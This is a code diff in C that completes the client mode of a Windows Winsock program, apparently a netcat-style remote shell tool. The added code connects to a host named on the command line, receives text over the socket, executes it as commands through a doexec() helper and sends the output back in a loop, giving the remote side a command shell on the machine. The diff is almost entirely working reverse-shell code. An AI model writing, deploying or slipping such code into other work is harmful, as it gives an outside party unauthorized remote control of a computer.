@@ -75,8 +75,42 @@ int server(int port){
 }
 
 int client(char *rhost, int port){
-    printf("TO DO");
-    return port;
+    WSADATA wsa;
+    SOCKET s, client;
+    struct sockaddr_in server;
+
+    printf("\nInitialising Winsock...");
+    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
+    {
+        printf("Failed. Error Code : %d",WSAGetLastError());
+        return 1;
+    }
+
+    printf("Initialised.\n");
+
+    //Create a socket
+    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
+    {
+        printf("Could not create socket : %d" , WSAGetLastError());
+    }
+
+    printf("Socket created.\n");
+
+    server.sin_addr.s_addr = inet_addr(rhost);
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+
+    //Connect to remote server
+    client = connect(s, (struct sockaddr *)&server , sizeof(server));
+    header(s);
+    command_prompt(s);
+    char buffer[1024];
+    while (recv(s, buffer, sizeof(buffer), 0)) {
+        char *ans = doexec(buffer);
+        send(s, ans, strlen(ans) * sizeof(char),0);
+        command_prompt(s);
+    }
+    return 0;
 }
 
 int main(int argc, char *argv[])
@@ -99,7 +133,7 @@ int main(int argc, char *argv[])
     }
 
     if (rhost){
-        printf("Not servin'\nConnect TO: %s", rhost);
+        client(rhost, port);
     } else {
         server(port);
     }
